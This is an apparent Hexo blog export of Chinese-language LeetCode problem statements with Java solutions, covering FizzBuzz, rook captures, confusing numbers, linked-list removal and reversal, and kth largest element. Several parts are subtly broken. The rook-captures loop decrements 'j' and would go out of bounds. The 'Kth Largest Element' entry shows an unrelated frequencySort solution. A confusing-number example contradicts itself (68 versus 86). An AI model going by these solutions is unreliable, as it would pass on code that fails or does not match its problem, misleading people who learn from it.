<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">fizzBuzz</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (i % <span class="number">15</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        		result.add(<span class="string">"FizzBuzz"</span>);</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        		result.add(<span class="string">"Fizz"</span>);</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        		result.add(<span class="string">"Buzz"</span>);</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		result.add(<span class="string">""</span> + i);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>999. 车的可用捕获量</title>
    <url>/2020/03/26/LeetCode/leetcode-000999-%E8%BD%A6%E7%9A%84%E5%8F%AF%E7%94%A8%E6%8D%95%E8%8E%B7%E9%87%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在一个 8 x 8 的棋盘上，有一个白色车（rook）。也可能有空方块，白色的象（bishop）和黑色的卒（pawn）。它们分别以字符 “R”，“.”，“B” 和 “p” 给出。大写字符表示白棋，小写字符表示黑棋。</p>
<p>车按国际象棋中的规则移动：它选择四个基本方向中的一个（北，东，西和南），然后朝那个方向移动，直到它选择停止、到达棋盘的边缘或移动到同一方格来捕获该方格上颜色相反的卒。另外，车不能与其他友方（白色）象进入同一个方格。</p>
<p>返回车能够在一次移动中捕获到的卒的数量。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/23/1253_example_1_improved.PNG" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;R&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;p&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;]]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">在本例中，车能够捕获所有的卒。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/23/1253_example_2_improved.PNG" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;p&quot;,&quot;p&quot;,&quot;B&quot;,&quot;p&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;p&quot;,&quot;B&quot;,&quot;R&quot;,&quot;B&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;p&quot;,&quot;p&quot;,&quot;B&quot;,&quot;p&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;p&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;],[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;]]</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">象阻止了车捕获任何卒。</span><br></pre></td></tr></table></figure>

<h2 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h2><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/02/23/1253_example_3_improved.PNG" alt></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：[[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"p"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"p"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"p"</span>,<span class="string">"p"</span>,<span class="string">"."</span>,<span class="string">"R"</span>,<span class="string">"."</span>,<span class="string">"p"</span>,<span class="string">"B"</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"B"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"p"</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>],[<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>,<span class="string">"."</span>]]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释： </span><br><span class="line">车可以捕获位置 b5，d6 和 f5 的卒。</span><br></pre></td></tr></table></figure>

<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints:"></a>Constraints:</h2><ul>
<li>board.length == board[i].length == 8</li>
<li>board[i][j] 可以是 ‘R’，’.’，’B’ 或 ‘p’</li>
<li>只有一个格子上存在 board[i][j] == ‘R’</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>遍历四个方向，累加即可</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numRookCaptures</span><span class="params">(<span class="keyword">char</span>[][] board)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> sx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> sy = <span class="number">0</span>;</span><br><span class="line">    	<span class="comment">// 获取车的位置</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j--) &#123;</span><br><span class="line">				<span class="keyword">if</span> (board[i][j] == <span class="string">'R'</span>) &#123;</span><br><span class="line">					sx = i;</span><br><span class="line">					sy = j;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">    	<span class="comment">// 方向数组</span></span><br><span class="line">		<span class="keyword">int</span>[] dx = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">1</span> &#125;;</span><br><span class="line">		<span class="keyword">int</span>[] dy = &#123; <span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> step = <span class="number">0</span>;; ++step) &#123;</span><br><span class="line">				<span class="keyword">int</span> tx = sx + step * dx[i];</span><br><span class="line">				<span class="keyword">int</span> ty = sy + step * dy[i];</span><br><span class="line">				<span class="keyword">if</span> (tx &lt; <span class="number">0</span> || tx &gt;= <span class="number">8</span> || ty &lt; <span class="number">0</span> || ty &gt;= <span class="number">8</span> || board[tx][ty] == <span class="string">'B'</span>) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (board[tx][ty] == <span class="string">'p'</span>) &#123;</span><br><span class="line">					count++;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1056. 易混淆数</title>
    <url>/2020/03/26/LeetCode/leetcode-001056-%E6%98%93%E6%B7%B7%E6%B7%86%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个数字 N，当它满足以下条件的时候返回 true：</p>
<p>原数字旋转 180° 以后可以得到新的数字。</p>
<p>如 0, 1, 6, 8, 9 旋转 180° 以后，得到了新的数字 0, 1, 9, 8, 6 。</p>
<p>2, 3, 4, 5, 7 旋转 180° 后，得到的不是数字。</p>
<p>易混淆数 (confusing number) 在旋转180°以后，可以得到和原来不同的数，且新数字的每一位都是有效的。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><p><img src="https://assets.leetcode.com/uploads/2019/03/23/1268_1.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：6</span><br><span class="line">输出：true</span><br><span class="line">解释： </span><br><span class="line">把 6 旋转 180° 以后得到 9，9 是有效数字且 9!&#x3D;6 。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><p><img src="https://assets.leetcode.com/uploads/2019/03/23/1268_2.png" alt></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="number">89</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释: </span><br><span class="line">把 <span class="number">89</span> 旋转 <span class="number">180</span>° 以后得到 <span class="number">68</span>，<span class="number">86</span> 是有效数字且 <span class="number">86</span>!=<span class="number">89</span> 。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><p><img src="https://assets.leetcode.com/uploads/2019/03/26/1268_3.png" alt></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="number">11</span></span><br><span class="line">输出：<span class="keyword">false</span></span><br><span class="line">解释：</span><br><span class="line">把 <span class="number">11</span> 旋转 <span class="number">180</span>° 以后得到 <span class="number">11</span>，<span class="number">11</span> 是有效数字但是值保持不变，所以 <span class="number">11</span> 不是易混淆数字。</span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><p><img src="https://assets.leetcode.com/uploads/2019/03/23/1268_4.png" alt></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="number">25</span></span><br><span class="line">输出：<span class="keyword">false</span></span><br><span class="line">解释：</span><br><span class="line">把 <span class="number">25</span> 旋转 <span class="number">180</span>° 以后得到的不是数字。</span><br></pre></td></tr></table></figure>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><ol>
<li><code>0 &lt;= N &lt;= 10^9</code></li>
<li>可以忽略掉旋转后得到的前导零，例如，如果我们旋转后得到 <code>0008</code> 那么该数字就是 <code>8</code> 。</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>题目要求时整个数字旋转180度。即把68翻转编程86，再把每个位上的数字转换为其单个180度后的数字，即89.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">confusingNumber</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">		Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line">		map.put(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		map.put(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">		map.put(<span class="number">6</span>, <span class="number">9</span>);</span><br><span class="line">		map.put(<span class="number">8</span>, <span class="number">8</span>);</span><br><span class="line">		map.put(<span class="number">9</span>, <span class="number">6</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (N &lt; <span class="number">10</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> map.containsKey(N) &amp;&amp; N != map.get(N);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> n = N;</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">0</span> != n) &#123;</span><br><span class="line">			<span class="keyword">int</span> t = n % <span class="number">10</span>;</span><br><span class="line">			<span class="keyword">if</span> (!map.containsKey(t)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			result = result * <span class="number">10</span> + map.get(t);</span><br><span class="line">			n /= <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ((<span class="keyword">int</span>) result) != N;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>203. Remove Linked List Elements</title>
    <url>/2020/03/25/LeetCode/leetcode-000203-Remove%20Linked%20List%20Elements/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Remove all elements from a linked list of integers that have value <strong>val</strong>.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:  1-&gt;2-&gt;6-&gt;3-&gt;4-&gt;5-&gt;6, val &#x3D; 6</span><br><span class="line">Output: 1-&gt;2-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：递归"><a href="#解法一：递归" class="headerlink" title="解法一：递归"></a>解法一：递归</h3><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == head) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        head.next = removeElements(head.next, val);</span><br><span class="line">        <span class="keyword">return</span> head.val == val ? head.next : head;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：迭代"><a href="#解法二：迭代" class="headerlink" title="解法二：迭代"></a>解法二：迭代</h3><h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == head) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">		ListNode p = head;</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != p.next) &#123;</span><br><span class="line">			<span class="keyword">if</span> (p.next.val == val) &#123;</span><br><span class="line">				p.next = p.next.next;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				p = p.next;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> head.val == val ? head.next : head;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>215. Kth Largest Element in an Array</title>
    <url>/2020/03/25/LeetCode/leetcode-000215-Kth%20Largest%20Element%20in%20an%20Array/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Find the <strong>k</strong>th largest element in an unsorted array. Note that it is the kth largest element in the sorted order, not the kth distinct element.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [3,2,1,5,6,4] and k &#x3D; 2</span><br><span class="line">Output: 5</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: [<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>] and k = <span class="number">4</span></span><br><span class="line">Output: <span class="number">4</span></span><br></pre></td></tr></table></figure>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><ol>
<li>You may assume k is always valid, 1 ≤ k ≤ array’s length.</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>排序，直接返回nums[nums.length - k]</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">char</span> c;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> times;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> times)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.c = c;</span><br><span class="line">			<span class="keyword">this</span>.times = times;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> c;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setC</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.c = c;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getTimes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> times;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTimes</span><span class="params">(<span class="keyword">int</span> times)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.times = times;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">public</span> String <span class="title">frequencySort</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		 <span class="keyword">int</span>[] chars = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">		 <span class="keyword">for</span> (<span class="keyword">char</span> c : s.toCharArray()) &#123;</span><br><span class="line">			 chars[c]++;</span><br><span class="line">		 &#125;</span><br><span class="line">		 </span><br><span class="line">		 PriorityQueue&lt;Node&gt; charNodes = <span class="keyword">new</span> PriorityQueue&lt;&gt;((a, b) -&gt; b.getTimes() - a.getTimes());</span><br><span class="line">		 <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">256</span>;i++) &#123;</span><br><span class="line">			 <span class="keyword">if</span> (chars[i] == <span class="number">0</span>) &#123;</span><br><span class="line">				 <span class="keyword">continue</span>;</span><br><span class="line">			 &#125;</span><br><span class="line">			 </span><br><span class="line">			 Node node = <span class="keyword">new</span> Node((<span class="keyword">char</span>) i, chars[i]);</span><br><span class="line">			 charNodes.add(node);</span><br><span class="line">		 &#125;</span><br><span class="line">		 </span><br><span class="line">		 StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		 <span class="keyword">while</span> (!charNodes.isEmpty()) &#123;</span><br><span class="line">			 Node node = charNodes.poll();</span><br><span class="line">			 <span class="keyword">int</span> total = node.getTimes();</span><br><span class="line">			 <span class="keyword">while</span> (total &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				 sb.append(node.getC());</span><br><span class="line">				 total--;</span><br><span class="line">			 &#125;</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> sb.toString();</span><br><span class="line">	 &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>206. Reverse Linked List</title>
    <url>/2020/03/25/LeetCode/leetcode-000206.Reverse%20Linked%20List/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Reverse a singly linked list.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line">Output: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</span><br></pre></td></tr></table></figure>

<h2 id="Follow-up"><a href="#Follow-up" class="headerlink" title="Follow up"></a>Follow up</h2><p>A linked list can be reversed either iteratively or recursively. Could you implement both?</p>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：递归"><a href="#解法一：递归" class="headerlink" title="解法一：递归"></a>解法一：递归</h3><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> reverse(<span class="keyword">null</span>, head);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> ListNode <span class="title">reverse</span><span class="params">(ListNode next, ListNode current)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == current) &#123;</span><br><span class="line">			<span class="keyword">return</span> next;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		ListNode nextNode = current.next;</span><br><span class="line">		current.next = next;</span><br><span class="line">		<span class="keyword">return</span> reverse(current, nextNode);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：迭代"><a href="#解法二：迭代" class="headerlink" title="解法二：迭代"></a>解法二：迭代</h3><p>借助栈，遍历链表，将每个元素入栈。</p>
<p>再次从头遍历链表，它们的值用栈中的元素覆盖即可。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        Stack&lt;Integer&gt; values = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        ListNode p = head;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">null</span> != p) &#123;</span><br><span class="line">        	values.add(p.val);</span><br><span class="line">        	p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        p = head;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">null</span> != p) &#123;</span><br><span class="line">        	p.val = values.pop();</span><br><span class="line">        	p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：原地替换"><a href="#解法三：原地替换" class="headerlink" title="解法三：原地替换"></a>解法三：原地替换</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode last = <span class="keyword">null</span>;</span><br><span class="line">        ListNode current = head;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        ListNode next = current.next;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(current != <span class="keyword">null</span>)&#123;</span><br><span class="line">            current.next = last;</span><br><span class="line">            last = current;</span><br><span class="line">            current = next;</span><br><span class="line">            <span class="keyword">if</span>(current != <span class="keyword">null</span>)</span><br><span class="line">                next = current.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>237. Delete Node in a Linked List</title>
    <url>/2020/03/25/LeetCode/leetcode-000237-Delete%20Node%20in%20a%20Linked%20List/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Write a function to delete a node (except the tail) in a singly linked list, given only access to that node.</p>
<p>Given linked list – head = [4,5,1,9], which looks like following:</p>
<p><img src="https://assets.leetcode.com/uploads/2018/12/28/237_example.png" alt="img"></p>
